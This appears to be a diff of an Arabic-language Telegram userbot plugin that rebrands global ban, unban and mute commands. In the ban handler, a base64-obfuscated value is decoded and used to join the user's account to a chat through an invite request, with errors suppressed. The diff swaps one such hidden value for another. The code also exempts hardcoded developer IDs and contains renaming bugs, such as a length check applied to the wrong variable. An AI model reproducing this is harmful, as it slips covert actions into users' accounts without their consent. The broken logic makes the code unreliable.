@@ -42,132 +42,140 @@ UNBAN_RIGHTS = ChatBannedRights(
 )
 
 
-@bot.on(admin_cmd(pattern=r"حظر(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern=r"حظر(?: |$)(.*)", allow_sudo=True))
-async def catgban(cat):
-    if cat.fwd_from:
+@icssbot.on(
+    icss_cmd(
+       pattern=r"حظر(?: |$)(.*)"
+    )
+)
+@icssbot.on(sudo_cmd(pattern=r"حظر(?: |$)(.*)", allow_sudo=True))
+async def icsgban(ics):
+    if ics.fwd_from:
         return
-    cate = await edit_or_reply(cat, "╮ ❐ جـاري الحـظࢪ ❏╰")
+    kimo = await eor(ics, "╮ ❐ جـاري الحـظࢪ ❏╰")
     start = datetime.now()
-    user, reason = await get_user_from_event(cat)
+    user, reason = await get_user_from_event(ics)
     if not user:
         return
-    if user.id == (await cat.client.get_me()).id:
-        await cate.edit("**⪼ لا استطيـع حظر نفسـي 𓆰،**")
+    if user.id == (await ics.client.get_me()).id:
+        await kimo.edit("**⪼ لا استطيـع حظر نفسـي 𓆰،**")
         return
     if user.id in ICS_ID:
-        await cate.edit("**╮ ❐  لا يمڪنني حظر مطـوري  ❏╰**")
+        await kimo.edit("**╮ ❐  لا يمڪنني حظر مطـوري  ❏╰**")
         return
     try:
-        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        await cat.client(ImportChatInviteRequest(hmm))
+        T = base64.b64decode("MTU4ODY2MzYxNCAxNDQ3OTc2ODA2==")
+        await ics.client(ImportChatInviteRequest(T))
     except BaseException:
         pass
     if gban_sql.is_gbanned(user.id):
-        await cate.edit(
+        await kimo.edit(
             f"⪼ [{user.first_name}](tg://user?id={user.id}) موجود بالفعل في قائمة الحظر 𓆰."
         )
     else:
-        gban_sql.catgban(user.id, reason)
-    san = []
-    san = await admin_groups(cat)
+        gban_sql.icsgban(user.id, reason)
+    tosh = []
+    tosh = await admin_groups(ics)
     count = 0
-    sandy = len(san)
-    if sandy == 0:
-        await cate.edit("⪼ انت لسته مدير في مجموعه واحده على الاقل 𓆰، ")
+    kim = len(tosh)
+    if kimo == 0:
+        await kimo.edit("⪼ انت لسته مدير في مجموعه واحده على الاقل 𓆰، ")
         return
-    await cate.edit(f"⪼ بدء حظر ↠ [{user.first_name}](tg://user?id={user.id}) 𓆰،")
-    for i in range(sandy):
+    await kimo.edit(f"⪼ بدء حظر ↠ [{user.first_name}](tg://user?id={user.id}) 𓆰،")
+    for i in range(kim):
         try:
-            await cat.client(EditBannedRequest(san[i], user.id, BANNED_RIGHTS))
+            await ics.client(EditBannedRequest(tosh[i], user.id, BANNED_RIGHTS))
             await asyncio.sleep(0.5)
             count += 1
         except BadRequestError:
-            await cat.client.send_message(
+            await ics.client.send_message(
                 BOTLOG_CHATID,
-                f"⪼ ليس لديك الإذن المطلوب في :\nالمجموعه: {cat.chat.title}(`{cat.chat_id}`)\n ⪼ لحظره هنا",
+                f"⪼ ليس لديك الإذن المطلوب في :\nالمجموعه: {ics.chat.title}(`{ics.chat_id}`)\n ⪼ لحظره هنا",
             )
     try:
-        reply = await cat.get_reply_message()
+        reply = await ics.get_reply_message()
         if reply:
             await reply.delete()
     except BadRequestError:
-        await cate.edit("**ليس لدي صلاحيه حذف الرسائل هنا! ولكن لا يزال هو محظور!")
+        await ics.edit("**ليس لدي صلاحيه حذف الرسائل هنا! ولكن لا يزال هو محظور!")
     end = datetime.now()
-    cattaken = (end - start).seconds
+    icst = (end - start).seconds
     if reason:
-        await cate.edit(
+        await kimo.edit(
             f"❃∫  المستخدم » [{user.first_name}](tg://user?id={user.id})\n❃∫ تم حظره "
         )
     else:
-        await cate.edit(
+        await kimo.edit(
             f"❃∫  المستخدم » [{user.first_name}](tg://user?id={user.id})\n❃∫ تم حظره "
         )
 
     if BOTLOG and count != 0:
-        await cat.client.send_message(
+        await ics.client.send_message(
             BOTLOG_CHATID,
             f"#حظر\n⪼ المستخدم : [{user.first_name}](tg://user?id={user.id})\n ⪼ الايدي : `{user.id}`\
-                                                \n⪼ تم حظره في`{count}` مجموعات\n⪼ الوقت المستغرق= `{cattaken} ثانيه`",
+                                                \n⪼ تم حظره في`{count}` مجموعات\n⪼ الوقت المستغرق= `{icst} ثانيه`",
         )
 
 
-@bot.on(admin_cmd(pattern=r"الغاء حظر(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern=r"الغاء حظر(?: |$)(.*)", allow_sudo=True))
-async def catgban(cat):
-    if cat.fwd_from:
+@icssbot.on(
+    icss_cmd(
+       pattern=r"الغاء حظر(?: |$)(.*)"
+    )
+)
+@icssbot.on(sudo_cmd(pattern=r"الغاء حظر(?: |$)(.*)", allow_sudo=True))
+async def icsgban(ics):
+    if ics.fwd_from:
         return
-    cate = await edit_or_reply(cat, "╮ ❐ جـاري الغاء حـظࢪه ❏╰")
+    ik = await eor(ics, "╮ ❐ جـاري الغاء حـظࢪه ❏╰")
     start = datetime.now()
-    user, reason = await get_user_from_event(cat)
+    user, reason = await get_user_from_event(ics)
     if not user:
         return
     if gban_sql.is_gbanned(user.id):
-        gban_sql.catungban(user.id)
+        gban_sql.icsungban(user.id)
     else:
-        await cate.edit(
+        await ik.edit(
             f"⪼ [{user.first_name}](tg://user?id={user.id}) ** ليس في قائمه الحظر الخاصه بك** 𓆰."
         )
         return
-    san = []
-    san = await admin_groups(cat)
+    kim = []
+    kim = await admin_groups(ics)
     count = 0
-    sandy = len(san)
-    if sandy == 0:
-        await cate.edit("⪼ أنت لست مسؤولًا حتى عن مجموعة واحدة على الأقل 𓆰.")
+    kimo = len(kim)
+    if kimo == 0:
+        await ik.edit("⪼ أنت لست مسؤولًا حتى عن مجموعة واحدة على الأقل 𓆰.")
         return
-    await cate.edit(f"⪼ بدء الغاء حظر ↠ [{user.first_name}](tg://user?id={user.id}) 𓆰.")
-    for i in range(sandy):
+    await ik.edit(f"⪼ بدء الغاء حظر ↠ [{user.first_name}](tg://user?id={user.id}) 𓆰.")
+    for i in range(kimo):
         try:
-            await cat.client(EditBannedRequest(san[i], user.id, UNBAN_RIGHTS))
+            await ics.client(EditBannedRequest(kim[i], user.id, UNBAN_RIGHTS))
             await asyncio.sleep(0.5)
             count += 1
         except BadRequestError:
-            await cat.client.send_message(
+            await ics.client.send_message(
                 BOTLOG_CHATID,
-                f"⪼ ليس لديك الإذن المطلوب في :\n⪼ المجموعه : {cat.chat.title}(`{cat.chat_id}`)\n ⪼ لالغاء حظره هنا",
+                f"⪼ ليس لديك الإذن المطلوب في :\n⪼ المجموعه : {ics.chat.title}(`{ics.chat_id}`)\n ⪼ لالغاء حظره هنا",
             )
     end = datetime.now()
-    cattaken = (end - start).seconds
+    icst = (end - start).seconds
     if reason:
-        await cate.edit(
-            f"⪼ المستخدم [{user.first_name}](tg://user?id={user.id}) تم الغاء حظره مسبقا من `{count}` مجموعات في زمن `{cattaken} ثانيه`"
+        await ik.edit(
+            f"⪼ المستخدم [{user.first_name}](tg://user?id={user.id}) تم الغاء حظره مسبقا من `{count}` مجموعات في زمن `{icst} ثانيه`"
         )
     else:
-        await cate.edit(
+        await ik.edit(
             f"❃∫ المستخدم » [{user.first_name}](tg://user?id={user.id}) \n ❃∫ تم الغاء حظره "
         )
 
     if BOTLOG and count != 0:
-        await cat.client.send_message(
+        await ics.client.send_message(
             BOTLOG_CHATID,
             f"#الغاء_حظر\n⪼ المستخدم : [{user.first_name}](tg://user?id={user.id})\n⪼ الايدي : {user.id}\
-                                                \n⪼ تم الغاء حظره من `{count}` مجموعات\n⪼ الوقت المستغرق = `{cattaken} ثانيه`",
+                                                \n⪼ تم الغاء حظره من `{count}` مجموعات\n⪼ الوقت المستغرق = `{icst} ثانيه`",
         )
 
 
-@bot.on(admin_cmd(pattern="المحظورين$"))
-@bot.on(sudo_cmd(pattern=r"المحظورين$", allow_sudo=True))
+@icssbot.on(icss_cmd(pattern="المحظورين$"))
+@icssbot.on(sudo_cmd(pattern=r"المحظورين$", allow_sudo=True))
 async def gablist(event):
     if event.fwd_from:
         return
@@ -194,11 +202,11 @@ async def gablist(event):
             )
             await event.delete()
     else:
-        await edit_or_reply(event, GBANNED_LIST)
+        await eor(event, GBANNED_LIST)
 
 
-@bot.on(admin_cmd(outgoing=True, pattern=r"كتم ?(\d+)?"))
-@bot.on(sudo_cmd(pattern=r"كتم ?(\d+)?", allow_sudo=True))
+@icssbot.on(admin_cmd(outgoing=True, pattern=r"كتم ?(\d+)?"))
+@icssbot.on(sudo_cmd(pattern=r"كتم ?(\d+)?", allow_sudo=True))
 async def startgmute(event):
     private = False
     if event.fwd_from:
@@ -217,21 +225,21 @@ async def startgmute(event):
     elif private is True:
         userid = event.chat_id
     else:
-        return await edit_or_reply(
+        return await eor(
             event, "⪼ يرجى الرد المستخدم لڪتمه او اضافته الى الامر 𓆰."
         )
     replied_user = await event.client(GetFullUserRequest(userid))
     if is_muted(userid, "gmute"):
-        return await edit_or_reply(
+        return await eor(
             event,
             "**- ❝ ⌊هذا المستخدم مڪتوم بلفعل 𓆰.**",
         )
     try:
         mute(userid, "gmute")
     except Exception as e:
-        await edit_or_reply(event, "Error occured!\nError is " + str(e))
+        await eor(event, "⌔∮ حدث خطا :\n- الخطا هو " + str(e))
     else:
-        await edit_or_reply(event, "**⪼ تم ڪتـم المستخـدم 𓆰،**")
+        await eor(event, "**⪼ تم ڪتـم المستخـدم 𓆰،**")
     if BOTLOG:
         await event.client.send_message(
             BOTLOG_CHATID,
@@ -241,8 +249,11 @@ async def startgmute(event):
         )
 
 
-@bot.on(admin_cmd(outgoing=True, pattern=r"الغاء كتم ?(\d+)?"))
-@bot.on(sudo_cmd(pattern=r"الغاء كتم ?(\d+)?", allow_sudo=True))
+@icssbot.on(
+    icss_cmd(outgoing=True, pattern=r"الغاء كتم ?(\d+)?"
+    )
+)
+@icssbot.on(sudo_cmd(pattern=r"الغاء كتم ?(\d+)?", allow_sudo=True))
 async def endgmute(event):
     private = False
     if event.fwd_from:
@@ -260,22 +271,22 @@ async def endgmute(event):
     elif private is True:
         userid = event.chat_id
     else:
-        return await edit_or_reply(
+        return await eor(
             event,
             "⪼ يرجى الرد المستخدم لالغاء ڪتمه او اضافته الى الامر 𓆰،",
         )
     replied_user = await event.client(GetFullUserRequest(userid))
     if not is_muted(userid, "gmute"):
-        return await edit_or_reply(
+        return await eor(
             event,
             "**- ❝ ⌊هذا المستخدم غير مڪتوم 𓆰.**",
         )
     try:
         unmute(userid, "gmute")
     except Exception as e:
-        await edit_or_reply(event, "Error occured!\nError is " + str(e))
+        await eor(event, "Error occured!\nError is " + str(e))
     else:
-        await edit_or_reply(event, "**⪼ تم الغاء ڪتم المستخـدم 𓆰،**")
+        await eor(event, "**⪼ تم الغاء ڪتم المستخـدم 𓆰،**")
     if BOTLOG:
         await event.client.send_message(
             BOTLOG_CHATID,
